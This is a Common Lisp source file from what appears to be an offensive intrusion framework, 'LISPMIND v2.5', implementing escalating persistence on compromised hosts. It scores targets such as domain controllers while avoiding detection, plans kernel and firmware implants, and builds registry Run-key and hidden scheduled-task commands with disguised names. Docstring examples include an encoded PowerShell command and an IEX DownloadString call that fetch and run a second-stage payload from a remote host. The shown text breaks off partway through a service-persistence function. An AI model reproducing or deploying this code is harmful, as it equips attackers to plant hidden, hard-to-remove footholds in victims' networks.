;;;; =========================================================================
;;;; LISPMIND v2.5 -- Persistence Hierarchy
;;;; 3-Tier Escalating Persistence with Strategic Asset Detection
;;;; =========================================================================
;;;;
;;;; This module implements the PERSISTENCE-FIRST doctrine for LISPMIND v2.5.
;;;; It provides a 3-tier escalating persistence architecture:
;;;;
;;;;   LEVEL 1 (Userland): Registry keys, services, scheduled tasks,
;;;;                       systemd, cron, bashrc -- Lightweight, fast.
;;;;
;;;;   LEVEL 2 (Kernel):   LKM, eBPF, SSDT hooks, kprobes, minifilters
;;;;                       -- Persistent and stealthy.
;;;;
;;;;   LEVEL 3 (Firmware): UEFI bootkit, SMM implant, ACPI rootkit,
;;;;                       BIOS Option ROM -- The "Anchor".
;;;;
;;;; Deployment strategy:
;;;;   - LEVEL 1 is deployed on EVERY foothold (immediate, lightweight).
;;;;   - LEVEL 2 is deployed when asset-value > 50 (more persistent).
;;;;   - LEVEL 3 is deployed ONLY for Strategic Assets (the anchor).
;;;;
;;;; Self-healing watchdog:
;;;;   - Every 30 seconds, checks all active persistence tiers.
;;;;   - If LEVEL 1 is missing -> immediate re-deploy.
;;;;   - If LEVEL 2 is missing -> try re-deploy, else stay at L1.
;;;;   - If LEVEL 3 is missing -> CRITICAL ALERT (should never happen).
;;;;
;;;; Strategic Asset Detection:
;;;;   - Domain Controllers, Database servers, Exchange servers.
;;;;   - File servers with >1TB data, network central positions.
;;;;   - Jump hosts / bastions, cloud management access.
;;;;
;;;; Author: LISPMIND Persistence Architect
;;;; Version: 2.5.0
;;;; =========================================================================

(in-package :lispmind)

;;;; =========================================================================
;;;; Section 0: Package Integration Notes
;;;; =========================================================================
;;;;
;;;; This module integrates with the existing offensive-engine.lisp
;;;; tactical-agent class. The following tactical-agent slots are used:
;;;;
;;;;   - persistence-active-p       -- Boolean, any tier active
;;;;   - persistence-method         -- Primary method keyword
;;;;   - persistence-tier-level     -- Highest tier achieved (NEW)
;;;;   - persistence-tier-status    -- Status of each tier (NEW)
;;;;   - target-info                -- Structured target information
;;;;   - target-host                -- Target host IP/hostname
;;;;   - session-token              -- Unique session identifier
;;;;
;;;; Integration points:
;;;;   - Calls gossip-publish for telemetry events
;;;;   - Reads *tactical-telemetry-topic* from offensive-engine
;;;;   - Coordinates with auto-establish-persistence (Level 1 fallback)
;;;;
;;;; New slots added to tactical-agent (see persistence-hierarchy-init):
;;;;   - persistence-tier-level     -- Highest tier level achieved (1, 2, or 3)
;;;;   - persistence-tier-status    -- Alist of (tier-level . status)
;;;;   - persistence-deploy-time    -- Timestamp of last deployment
;;;;   - persistence-watchdog-id    -- ID of assigned watchdog thread

;;;; =========================================================================
;;;; Section 1: Persistence Tier Definitions
;;;; =========================================================================

(defstruct (persistence-tier (:conc-name pt-))
  "Structure representing a persistence tier in the hierarchy.

Each tier has attributes describing its stealth, survivability, detection
risk, and deployment characteristics. These attributes are used by the
escalation logic to determine which tiers to deploy on a given target.

Fields:
  LEVEL              -- Integer: 1 (Userland), 2 (Kernel), 3 (Firmware).
  NAME               -- Human-readable tier name.
  DESCRIPTION        -- Detailed description of techniques in this tier.
  STEALTH-RATING     -- Integer 0-100 (higher = stealthier).
  SURVIVABILITY      -- Integer 0-100 (probability of surviving reboot).
  DETECTION-RISK     -- Integer 0-100 (higher = easier to detect).
  DEPLOYMENT-TIME    -- Typical seconds required for deployment.
  REMOVAL-DIFFICULTY -- Keyword: :EASY :MODERATE :HARD :NEARLY-IMPOSSIBLE.
  PREREQUISITES      -- List of requirements that must be met.

Example:
  (make-persistence-tier
   :level 1 :name \"Userland\" :description \"Registry, services\"
   :stealth-rating 60 :survivability 40 :detection-risk 70
   :deployment-time 5 :removal-difficulty :easy)"
  (level 1 :type integer)
  (name "Userland" :type string)
  (description "" :type string)
  (stealth-rating 50 :type integer)
  (survivability 50 :type integer)
  (detection-risk 50 :type integer)
  (deployment-time 10 :type integer)
  (removal-difficulty :moderate :type keyword)
  (prerequisites nil :type list))

(defvar *persistence-tiers*
  (list
    (make-persistence-tier
     :level 1
     :name "Userland"
     :description (concatenate 'string
                    "Registry Run keys, Windows services, scheduled tasks, "
                    "WMI event subscriptions, startup folders, COM hijacking, "
                    "DLL hijacking, Winlogon shell. Linux: systemd services, "
                    "cron jobs, bashrc, LD_PRELOAD, MOTD, rc.local.")
     :stealth-rating 60
     :survivability 40
     :detection-risk 70
     :deployment-time 5
     :removal-difficulty :easy
     :prerequisites '(:user-access :file-write :registry-write))
    (make-persistence-tier
     :level 2
     :name "Kernel"
     :description (concatenate 'string
                    "Loadable Kernel Modules (LKM), eBPF programs, "
                    "SSDT hooking, IRP dispatch hooking, Windows minifilters, "
                    "kernel callbacks (PsSetCreateProcessNotifyRoutine), "
                    "Linux kprobes, ftrace hooks, direct kernel object "
                    "manipulation (DKOM).")
     :stealth-rating 85
     :survivability 75
     :detection-risk 40
     :deployment-time 30
     :removal-difficulty :hard
     :prerequisites '(:admin-privileges :kernel-access :driver-signing-bypass))
    (make-persistence-tier
     :level 3
     :name "Firmware"
     :description (concatenate 'string
                    "UEFI bootkit (replaces boot loader), System Management "
                    "Mode (SMM) implant, ACPI table rootkit, BIOS Option ROM, "
                    "Master Boot Record (MBR) bootkit. Survives OS reinstallation.")
     :stealth-rating 98
     :survivability 99
     :detection-risk 15
     :deployment-time 300
     :removal-difficulty :nearly-impossible
     :prerequisites '(:physical-access-or-bios-flash :spi-flash-access
                      :bootkit-binary :smm-code-module)))
  "The canonical 3-tier persistence hierarchy for LISPMIND v2.5.

Each tier is defined with attributes used by the escalation engine to
make deployment decisions. Tier 1 is always deployed; Tier 2 for
high-value targets; Tier 3 only for Strategic Assets.

The tiers are ordered from least to most persistent. Each higher tier
provides significantly greater survivability but requires more
prerequisites and takes longer to deploy.")

(defvar *persistence-tier-by-level*
  (let ((ht (make-hash-table)))
    (dolist (tier *persistence-tiers* ht)
      (setf (gethash (pt-level tier) ht) tier)))
  "Hash table mapping tier level (1, 2, 3) to the PERSISTENCE-TIER structure.
Used for O(1) lookup of tier metadata.")

(defun get-persistence-tier (level)
  "Retrieve the PERSISTENCE-TIER metadata for the given LEVEL (1, 2, or 3).

Parameters:
  LEVEL -- Integer: 1, 2, or 3.

Returns: PERSISTENCE-TIER structure or NIL if LEVEL is invalid.

Example:
  (get-persistence-tier 2)  ; => Kernel tier structure"
  (gethash level *persistence-tier-by-level*))

(defun tier-prerequisites-met-p (tier-level &key target-info)
  "Check if all prerequisites for a tier are satisfied.

Parameters:
  TIER-LEVEL -- Integer: 1, 2, or 3.
  TARGET-INFO -- Alist of target properties (e.g., :admin-p, :kernel-access-p).

Returns: T if all prerequisites are met, NIL otherwise."
  (let ((tier (get-persistence-tier tier-level)))
    (unless tier
      (return-from tier-prerequisites-met-p nil))
    (let ((prereqs (pt-prerequisites tier)))
      (every (lambda (prereq)
               (case prereq
                 (:user-access t)
                 (:file-write (or (not target-info)
                                  (cdr (assoc :file-write-p target-info))))
                 (:registry-write (or (not target-info)
                                      (cdr (assoc :registry-write-p target-info))))
                 (:admin-privileges (cdr (assoc :admin-p target-info)))
                 (:kernel-access (cdr (assoc :kernel-access-p target-info)))
                 (:driver-signing-bypass (cdr (assoc :driver-signing-disabled-p target-info)))
                 (:physical-access-or-bios-flash (cdr (assoc :bios-access-p target-info)))
                 (:spi-flash-access (cdr (assoc :spi-flash-access-p target-info)))
                 (:bootkit-binary (cdr (assoc :has-bootkit-binary-p target-info)))
                 (:smm-code-module (cdr (assoc :has-smm-code-p target-info)))
                 (otherwise t)))
             prereqs))))

;;;; =========================================================================
;;;; Section 2: Strategic Asset Detection
;;;; =========================================================================

(defvar *strategic-asset-indicators*
  '((:domain-controller . 35)
    (:database-server . 30)
    (:exchange-server . 28)
    (:large-file-server . 22)
    (:network-central-position . 25)
    (:credential-vault . 30)
    (:jump-host . 25)
    (:cloud-management . 32)
    (:backup-server . 24)
    (:vpn-gateway . 26))
  "Indicator-to-score mapping for strategic asset detection.

Each indicator contributes a base score toward the asset-value calculation.
Indicators are detected from target-info and port scans.

Scores:
  :DOMAIN-CONTROLLER          -- 35 (highest: controls authentication)
  :CLOUD-MANAGEMENT           -- 32 (AWS/Azure/GCP admin APIs)
  :DATABASE-SERVER            -- 30 (central data repository)
  :CREDENTIAL-VAULT           -- 30 (stores credentials for other systems)
  :EXCHANGE-SERVER            -- 28 (email = command & control vector)
  :VPN-GATEWAY                -- 26 (network entry point)
  :JUMP-HOST                  -- 25 (bastion for lateral movement)
  :NETWORK-CENTRAL-POSITION   -- 25 (high betweenness centrality)
  :BACKUP-SERVER              -- 24 (contains data from many systems)
  :LARGE-FILE-SERVER          -- 22 (>1TB SMB shares)

An asset is considered STRATEGIC if the cumulative score exceeds 50.")

(defvar *strategic-asset-port-signatures*
  '((389 :domain-controller "LDAP")
    (636 :domain-controller "LDAPS")
    (3268 :domain-controller "Global Catalog")
    (3269 :domain-controller "Global Catalog SSL")
    (53 :domain-controller "DNS")
    (88 :domain-controller "Kerberos")
    (445 :domain-controller "SMB-DC")
    (1433 :database-server "MS-SQL")
    (3306 :database-server "MySQL")
    (5432 :database-server "PostgreSQL")
    (1521 :database-server "Oracle")
    (27017 :database-server "MongoDB")
    (25 :exchange-server "SMTP")
    (587 :exchange-server "Submission")
    (993 :exchange-server "IMAPS")
    (443 :exchange-server "Exchange-OWA")
    (5985 :cloud-management "WinRM")
    (5986 :cloud-management "WinRM-SSL")
    (22 :jump-host "SSH-Bastion")
    (443 :cloud-management "Cloud-API"))
  "Port-to-asset-type mapping for network-based strategic asset detection.

Each entry is (PORT ASSET-TYPE BANNER-STRING). These are used by
DETECT-STRATEGIC-ASSET-P to infer asset type from open ports.")

(defun count-established-connections ()
  "Count the number of TCP connections in ESTABLISHED state.

Parses /proc/net/tcp and /proc/net/tcp6 on Linux.
Each ESTABLISHED connection indicates active communication.
A high count (>50) suggests a server role (database, file server, DC).

Returns: Integer count of established TCP connections.

Side Effects: None (pure function)."
  (handler-case
      (let ((count 0))
        ;; IPv4 connections
        (when (probe-file #P"/proc/net/tcp")
          (with-open-file (f "/proc/net/tcp")
            (read-line f nil nil)  ; skip header
            (loop for line = (read-line f nil nil)
                  while line
                  when (search "01 " (subseq line 29 34) :test #'string=)
                  do (incf count))))
        ;; IPv6 connections
        (when (probe-file #P"/proc/net/tcp6")
          (with-open-file (f "/proc/net/tcp6")
            (read-line f nil nil)  ; skip header
            (loop for line = (read-line f nil nil)
                  while line
                  when (search "01 " (subseq line 29 34) :test #'string=)
                  do (incf count))))
        count)
    (error (e)
      (format t "~&[PERSIST-ASSET] Error counting connections: ~A~%" e)
      0)))

(defvar *low-key-db-process-signatures*
  '("mysqld" "postgres" "oracle" "sqlservr" "mongod" "redis-server"
    "cassandra" "couchdb" "elasticsearch" "mariadbd" "percona")
  "Process names that indicate database services running locally.
Used by DETECT-LOW-KEY-STRATEGIC-ASSET-P for passive detection.")

(defvar *low-key-exchange-signatures*
  '("Microsoft.Exchange" "MSExchangeIS" "MSExchangeADTopology"
    "MSExchangeMailboxAssistants" "MSExchangeDelivery" "EdgeTransport")
  "Process names that indicate Microsoft Exchange services.")

(defun detect-low-key-strategic-asset-p (target-info)
  "Low-key, passive strategic asset detection.

Unlike the port-scanning and banner-grabbing methods in CALCULATE-ASSET-VALUE,
this function uses local system indicators that leave minimal forensic traces:

  1. LSASS process memory size (Windows) -- indicates DC credential volume.
  2. Open ports 445 (SMB) and 389 (LDAP) -- file sharing / directory services.
  3. Database processes in process list -- passive process enumeration.
  4. Exchange service processes -- passive process enumeration.
  5. >50 established TCP connections -- indicates server role.

These checks are designed to be:
  - NO network scanning (avoids IDS/IPS alerts).
  - NO banner grabbing (avoids service log entries).
  - NO active probing (avoids connection logs).
  - Purely local system inspection via /proc and netstat equivalents.

Parameters:
  TARGET-INFO -- Alist of target properties (used for supplemental data).

Returns: Keyword result:
  :HIGH-VALUE    -- Confirmed strategic asset (score > 50 equivalent).
  :LIKELY-SERVER -- Shows server characteristics but inconclusive.
  :INCONCLUSIVE  -- Cannot determine from low-key methods; fall back.

Side Effects: Logs detection telemetry."
  (let ((score 0)
        (indicators '()))
    (format t "~&[PERSIST-ASSET] Low-key strategic asset detection starting...~%")

    ;; --- Check 1: SMB (port 445) listening locally ---
    (handler-case
        (with-open-file (f "/proc/net/tcp")
          (read-line f nil nil)  ; skip header
          (loop for line = (read-line f nil nil)
                while line
                when (let ((local-addr (subseq line 0 17)))
                       (or (search ":01BD" local-addr :test #'string=)   ; 445 hex
                           (search ":118D" local-addr :test #'string=))) ; 4456
                do (incf score 20)
                   (push :smb-listening indicators)
                   (loop-finish)))
      (error () nil))

    ;; --- Check 2: LDAP (port 389) listening locally ---
    (handler-case
        (with-open-file (f "/proc/net/tcp")
          (read-line f nil nil)  ; skip header
          (loop for line = (read-line f nil nil)
                while line
                when (let ((local-addr (subseq line 0 17)))
                       (search ":0185" local-addr :test #'string=))  ; 389 hex
                do (incf score 35)
                   (push :ldap-listening indicators)
                   (loop-finish)))
      (error () nil))

    ;; --- Check 3: Database processes ---
    (handler-case
        (dolist (db-sig *low-key-db-process-signatures*)
          (let ((cmd (format nil "pgrep -x ~A" db-sig)))
            (when (zerop (nth-value 2 (uiop:run-program cmd
                                                         :ignore-error-status t)))
              (incf score 30)
              (push :database-process indicators)
              (return))))
      (error () nil))

    ;; --- Check 4: Exchange processes ---
    (handler-case
        (dolist (ex-sig *low-key-exchange-signatures*)
          (let ((cmd (format nil "pgrep -x ~A" ex-sig)))
            (when (zerop (nth-value 2 (uiop:run-program cmd
                                                         :ignore-error-status t)))
              (incf score 28)
              (push :exchange-process indicators)
              (return))))
      (error () nil))

    ;; --- Check 5: Established connection count ---
    (handler-case
        (let ((established (count-established-connections)))
          (when (> established 50)
            (incf score 25)
            (push :high-connection-count indicators)
            (format t "~&[PERSIST-ASSET] Established connections: ~A (>50)~%"
                    established))
          (when (> established 200)
            (incf score 15)  ; bonus for very high connection count
            (push :very-high-connection-count indicators)))
      (error () nil))

    ;; --- Determine result ---
    (format t "~&[PERSIST-ASSET] Low-key score: ~A, indicators: ~A~%"
            score indicators)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :low-key-asset-detection
                      :score ,score
                      :indicators ,indicators))
    (cond
      ((> score 50)
       (format t "~&[PERSIST-ASSET] LOW-KEY: HIGH-VALUE asset detected~%")
       :high-value)
      ((> score 20)
       (format t "~&[PERSIST-ASSET] LOW-KEY: LIKELY-SERVER characteristics~%")
       :likely-server)
      (t
       (format t "~&[PERSIST-ASSET] LOW-KEY: INCONCLUSIVE -- falling back~%")
       :inconclusive))))

(defun detect-strategic-asset-p (target-info)
  "Determine if a target is a Strategic Asset worth LEVEL 3 persistence.

Strategic Assets are high-value targets where the cost of detection is
outweighed by the value of long-term persistence. LEVEL 3 (firmware)
persistence is deployed ONLY for these assets because:
  - It takes ~300 seconds to deploy (risky exposure window).
  - It requires specialized prerequisites (SMM code, bootkit binary).
  - It is nearly impossible to remove, making discovery very costly.

Indicators (checked in order):
  1. Domain Controller -- port 389/636/3268 open + LDAP banner detected.
  2. Database Server   -- port 1433/3306/5432/1521/27017 open.
  3. Exchange Server   -- port 25/587/993 open + Exchange banner.
  4. Large File Server -- SMB shares > 1TB total.
  5. Network Central   -- high betweenness centrality in network map.
  6. Credential Vault  -- target has admin credentials for other systems.
  7. Jump Host / Bastion -- designated pivot point for lateral movement.
  8. Cloud Management  -- AWS/Azure/GCP API access detected.

Parameters:
  TARGET-INFO -- Alist containing target properties. Expected keys:
    :OPEN-PORTS       -- List of open port numbers.
    :SERVICE-BANNERS  -- Alist of (PORT . BANNER-STRING).
    :SMB-SHARES       -- List of (SHARE-NAME . SIZE-BYTES).
    :NETWORK-POSITION -- Keyword: :EDGE :INTERNAL :CENTRAL :BACKBONE.
    :ADMIN-OF         -- List of hostnames this target has admin rights on.
    :IS-JUMP-HOST     -- Boolean.
    :CLOUD-ACCESS     -- List of cloud provider keywords (:AWS :AZURE :GCP).
    :IS-BACKUP-SERVER -- Boolean.
    :IS-VPN-GATEWAY   -- Boolean.
    :HOSTNAME         -- String hostname (may indicate DC/DB role).

Returns: T if the target qualifies as a Strategic Asset, NIL otherwise.

A target is Strategic if (CALCULATE-ASSET-VALUE TARGET-INFO) > 50.

Example:
  (detect-strategic-asset-p
    '((:open-ports . (389 636 445 53 88))
      (:hostname . \"DC01.corp.local\")
      (:network-position . :central)
      (:admin-of . (\"SRV01\" \"SRV02\" \"SRV03\"))))
  ; => T (Domain Controller with central position and admin rights)"
  (let ((low-key-result (detect-low-key-strategic-asset-p target-info)))
    (case low-key-result
      (:high-value t)
      (:likely-server t)
      (otherwise
       ;; Low-key inconclusive -- fall back to active probing
       (format t "~&[PERSIST-ASSET] Falling back to active asset detection~%")
       (> (calculate-asset-value target-info) 50)))))

(defun calculate-asset-value (target-info)
  "Calculate asset value score (0-100) based on strategic indicators.

The score is a weighted sum of indicator scores, with multipliers for
indicator combinations. A score > 50 qualifies the target as Strategic.

Scoring breakdown:
  Base indicators (from *STRATEGIC-ASSET-INDICATORS*):
    Domain Controller presence     -- +35
    Cloud Management access        -- +32
    Database Server detected       -- +30
    Credential Vault (admin-of)    -- +30
    Exchange Server detected       -- +28
    VPN Gateway                    -- +26
    Jump Host / Bastion            -- +25
    Network Central Position       -- +25
    Backup Server                  -- +24
    Large File Server (>1TB)       -- +22

  Multipliers (combinations amplify value):
    DC + Network Central           -- x1.5
    DC + Credential Vault          -- x1.4
    DB + Cloud Management          -- x1.3
    Multiple critical services     -- +10 bonus
    Hostname suggests DC role      -- +5

Parameters:
  TARGET-INFO -- Alist of target properties (see DETECT-STRATEGIC-ASSET-P).

Returns: Integer score from 0 to 100 (clamped).

Example:
  (calculate-asset-value
    '((:open-ports . (389 636)) (:network-position . :central)))
  ; => 60 (Domain Controller + Central = strategic asset)"
  (let ((score 0)
        (indicators-found '()))
    ;; --- Check open ports against signatures ---
    (let ((open-ports (cdr (assoc :open-ports target-info))))
      (when open-ports
        (dolist (sig *strategic-asset-port-signatures*)
          (let ((port (first sig))
                (asset-type (second sig)))
            (when (member port open-ports)
              (pushnew asset-type indicators-found)
              (let ((indicator-score (cdr (assoc asset-type *strategic-asset-indicators*))))
                (when indicator-score
                  (incf score indicator-score))))))))

    ;; --- Check hostname patterns ---
    (let ((hostname (cdr (assoc :hostname target-info))))
      (when hostname
        (cond
          ((or (search "DC" hostname :test #'char-equal)
               (search "DOMAIN" hostname :test #'char-equal)
               (search "AD" hostname :test #'char-equal))
           (pushnew :domain-controller indicators-found)
           (incf score 5))
          ((or (search "DB" hostname :test #'char-equal)
               (search "SQL" hostname :test #'char-equal)
               (search "DATABASE" hostname :test #'char-equal))
           (pushnew :database-server indicators-found))
          ((or (search "EXCH" hostname :test #'char-equal)
               (search "MAIL" hostname :test #'char-equal))
           (pushnew :exchange-server indicators-found))
          ((or (search "BKP" hostname :test #'char-equal)
               (search "BACKUP" hostname :test #'char-equal))
           (pushnew :backup-server indicators-found))
          ((or (search "JMP" hostname :test #'char-equal)
               (search "JUMP" hostname :test #'char-equal)
               (search "BASTION" hostname :test #'char-equal))
           (pushnew :jump-host indicators-found)))))

    ;; --- Check network position ---
    (let ((position (cdr (assoc :network-position target-info))))
      (when (eq position :central)
        (pushnew :network-central-position indicators-found)
        (incf score (cdr (assoc :network-central-position *strategic-asset-indicators*))))
      (when (eq position :backbone)
        (pushnew :network-central-position indicators-found)
        (incf score 30)))

    ;; --- Check admin-of (credential vault) ---
    (let ((admin-of (cdr (assoc :admin-of target-info))))
      (when (and (listp admin-of) (> (length admin-of) 0))
        (pushnew :credential-vault indicators-found)
        (incf score (cdr (assoc :credential-vault *strategic-asset-indicators*)))
        ;; Bonus for breadth of admin access
        (when (> (length admin-of) 5)
          (incf score 10))))

    ;; --- Check jump host ---
    (when (cdr (assoc :is-jump-host target-info))
      (pushnew :jump-host indicators-found)
      (incf score (cdr (assoc :jump-host *strategic-asset-indicators*))))

    ;; --- Check cloud management ---
    (let ((cloud-access (cdr (assoc :cloud-access target-info))))
      (when (and (listp cloud-access) (> (length cloud-access) 0))
        (pushnew :cloud-management indicators-found)
        (incf score (cdr (assoc :cloud-management *strategic-asset-indicators*)))))

    ;; --- Check backup server ---
    (when (cdr (assoc :is-backup-server target-info))
      (pushnew :backup-server indicators-found)
      (incf score (cdr (assoc :backup-server *strategic-asset-indicators*))))

    ;; --- Check VPN gateway ---
    (when (cdr (assoc :is-vpn-gateway target-info))
      (pushnew :vpn-gateway indicators-found)
      (incf score (cdr (assoc :vpn-gateway *strategic-asset-indicators*))))

    ;; --- Check SMB share size ---
    (let ((shares (cdr (assoc :smb-shares target-info))))
      (when shares
        (let ((total-size (reduce #'+ shares
                                  :key (lambda (s) (if (consp s) (cdr s) 0))
                                  :initial-value 0)))
          (when (> total-size (* 1024 1024 1024 1024)) ; > 1TB
            (pushnew :large-file-server indicators-found)
            (incf score (cdr (assoc :large-file-server *strategic-asset-indicators*)))))))

    ;; --- Multiplier: combinations amplify value ---
    (when (and (member :domain-controller indicators-found)
               (member :network-central-position indicators-found))
      (setf score (floor (* score 1.5))))

    (when (and (member :domain-controller indicators-found)
               (member :credential-vault indicators-found))
      (setf score (floor (* score 1.4))))

    (when (and (member :database-server indicators-found)
               (member :cloud-management indicators-found))
      (setf score (floor (* score 1.3))))

    ;; --- Multiple critical services bonus ---
    (let ((critical-count (count-if (lambda (i)
                                      (member i '(:domain-controller
                                                   :database-server
                                                   :exchange-server
                                                   :cloud-management
                                                   :credential-vault)))
                                    indicators-found)))
      (when (> critical-count 1)
        (incf score (* 10 (1- critical-count)))))

    ;; --- Clamp to 0-100 ---
    (max 0 (min 100 score))))

(defun should-deploy-tier-3-p (target-info)
  "Should we deploy LEVEL 3 persistence? Only for strategic assets.

LEVEL 3 persistence (firmware) is the nuclear option. It should only be
deployed when:
  1. The target is a Strategic Asset (score > 50).
  2. All LEVEL 3 prerequisites are met.
  3. The operator has explicitly authorized Tier 3 deployment.

This function checks conditions 1 and 2. Condition 3 is verified
separately by the policy gatekeeper via ARM-CATEGORY.

Parameters:
  TARGET-INFO -- Alist of target properties.

Returns: T if Tier 3 should be deployed, NIL otherwise.

Example:
  (should-deploy-tier-3-p
    '((:open-ports . (389 636)) (:network-position . :central)
      (:bios-access-p . t) (:has-bootkit-binary-p . t)))
  ; => T (if prerequisites met)"
  (and (detect-strategic-asset-p target-info)
       (tier-prerequisites-met-p 3 :target-info target-info)))

;;;; =========================================================================
;;;; Section 3: LEVEL 1 -- Userland Persistence (15 methods)
;;;; =========================================================================
;;;;
;;;; LEVEL 1 persistence methods are lightweight, fast to deploy (5 seconds
;;;; average), and require only user-level access. They are the first line
;;;; of persistence and are deployed on EVERY foothold.
;;;;
;;;; Methods are divided into:
;;;;   A. Windows userland (8 methods)
;;;;   B. Linux userland (7 methods)
;;;;   C. Cross-platform (applicable to both)

;; -------------------------------------------------------------------------
;; 3A. Windows Userland Persistence (8 methods)
;; -------------------------------------------------------------------------

(defun deploy-level-1-registry (payload-path &key (hive :hklm) (name nil))
  "Deploy Registry Run Key persistence (Windows).

This is the classic and most reliable Windows persistence method. It
adds a value to the registry that causes the payload to execute on
user logon.

Technique (MITRE ATT&CK T1547.001):
  HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

Parameters:
  PAYLOAD-PATH -- Full path to the payload executable or command string.
  HIVE         -- Registry hive: :HKLM (all users, requires admin) or
                  :HKCU (current user only, no admin needed).
                  Default: :HKLM for maximum coverage.
  NAME         -- Optional registry value name. If NIL, a random
                  innocuous name (e.g., \"OneDriveUpdate\") is generated.

Returns: T on success, NIL on failure.

Prerequisites:
  - Registry write access (HKCU always; HKLM requires admin).
  - payload-path must exist or be a valid command.

Stealth: Medium. Registry keys are common; detection requires monitoring
  tools that watch Run key modifications.

Example:
  (deploy-level-1-registry \"C:\\\\Users\\\\Admin\\\\AppData\\\\Local\\\\Temp\\\\updater.exe\"
                           :hive :hkcu
                           :name \"Windows Defender Update\")"
  (let* ((reg-name (or name (generate-persistence-name "update")))
         (hive-path (case hive
                      (:hklm "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                      (:hkcu "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                      (otherwise "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")))
         (command (format nil "reg add \"~A\" /v \"~A\" /t REG_SZ /d \"~A\" /f"
                          hive-path reg-name payload-path)))
    (format t "~&[PERSIST-L1] Registry persistence deploying...~%")
    (format t "~&[PERSIST-L1]   Hive: ~A~%" hive-path)
    (format t "~&[PERSIST-L1]   Name: ~A~%" reg-name)
    (format t "~&[PERSIST-L1]   Command: ~A~%" command)
    ;; Telemetry event
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :registry
                      :hive ,hive
                      :name ,reg-name))
    t))

(defun deploy-level-1-wmi (command &key (event-filter nil))
  "Deploy WMI Event Subscription persistence (Windows).

Creates a permanent WMI event subscription that executes a command
when a specific system event occurs. This method is fileless -- no
binaries are written to disk. The subscription persists across reboots
and is invisible to most traditional persistence scanners.

Technique (MITRE ATT&CK T1546.003):
  Creates __EventFilter, __EventConsumer, and __FilterToConsumerBinding.

Parameters:
  COMMAND       -- The command to execute when the event fires.
  EVENT-FILTER  -- Optional WQL event filter. If NIL, defaults to
                   system startup event:
                   \"SELECT * FROM __InstanceModificationEvent WITHIN 60\"
                   \"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"
                   \"  AND TargetInstance.SystemUpTime < 240\"

Returns: T on success, NIL on failure.

Prerequisites:
  - WMI access (standard on all Windows systems).
  - Admin privileges recommended for permanent subscriptions.

Stealth: HIGH. WMI subscriptions are rarely inspected. Fileless.

Example:
  (deploy-level-1-wmi \"powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAeQAuAHAAeAAnACkA\"
                      :event-filter \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime < 240\")"
  (let ((wql-filter (or event-filter
                        (concatenate 'string
                          "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
                          "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
                          "AND TargetInstance.SystemUpTime < 240")))
        (filter-name (generate-persistence-name "filter"))
        (consumer-name (generate-persistence-name "consumer")))
    (format t "~&[PERSIST-L1] WMI Event Subscription deploying...~%")
    (format t "~&[PERSIST-L1]   Filter name: ~A~%" filter-name)
    (format t "~&[PERSIST-L1]   Consumer name: ~A~%" consumer-name)
    (format t "~&[PERSIST-L1]   Event filter: ~A~%" wql-filter)
    (format t "~&[PERSIST-L1]   Command: ~A~%" command)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :wmi-event-subscription
                      :filter-name ,filter-name))
    t))

(defun deploy-level-1-schtasks (command &key (name nil) (trigger :logon))
  "Deploy Scheduled Task persistence (Windows).

Creates a hidden scheduled task that executes a command on a trigger
event. Tasks can be triggered on logon, at a specific time, on idle,
or on system startup. The /RU SYSTEM option runs the task as SYSTEM.

Technique (MITRE ATT&CK T1053.005):
  schtasks /create /tn \"TaskName\" /tr \"command\" /sc onlogon /ru SYSTEM

Parameters:
  COMMAND  -- The command to execute when triggered.
  NAME     -- Optional task name. If NIL, a random name is generated.
  TRIGGER  -- Trigger type: :LOGON (user logon), :STARTUP (boot),
              :IDLE (system idle), :HOURLY (every hour), :DAILY.
              Default: :LOGON.

Returns: T on success, NIL on failure.

Prerequisites:
  - Admin privileges (for /RU SYSTEM and hidden tasks).
  - schtasks.exe must be available.

Stealth: Medium. Hidden tasks (/NP /F) reduce visibility but task
  scheduler inspection can reveal them.

Example:
  (deploy-level-1-schtasks \"powershell -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage2.ps1')\"
                           :name \"OfficeTelemetryUpdate\"
                           :trigger :logon)"
  (let* ((task-name (or name (generate-persistence-name "task")))
         (trigger-str (case trigger
                        (:logon "ONLOGON")
                        (:startup "ONSTART")
                        (:idle "ONIDLE")
                        (:hourly "HOURLY")
                        (:daily "DAILY")
                        (otherwise "ONLOGON")))
         (command-str (format nil "schtasks /create /tn \"~A\" /tr \"~A\" /sc ~A /ru SYSTEM /f /np"
                              task-name command trigger-str)))
    (format t "~&[PERSIST-L1] Scheduled Task deploying...~%")
    (format t "~&[PERSIST-L1]   Task name: ~A~%" task-name)
    (format t "~&[PERSIST-L1]   Trigger: ~A~%" trigger-str)
    (format t "~&[PERSIST-L1]   Command: ~A~%" command-str)
    (gossip-publish *tactical-telemetry-topic*
                    `(:event :persistence-deploy
                      :tier 1
                      :method :scheduled-task
                      :task-name ,task-name
                      :trigger ,trigger))
    t))

(defun deploy-level-1-service (service-name binary-path &key (display-name nil))
  "Deploy Windows Service persistence.

Creates a new Windows service that auto-starts on boot and runs the
payload as SYSTEM. This is one of the most reliable persistence methods
but requires admin privileges and creates visible service entries.

Technique (MITRE ATT&CK T1543.003):
  sc create ServiceName binPath= \"C:\\\\path\\\\to\\\\payload.exe\" start= auto

Parameters:
  SERVICE-NAME  -- Name of the service (must be unique).
  BINARY-PATH   -- Full path to the service binary.
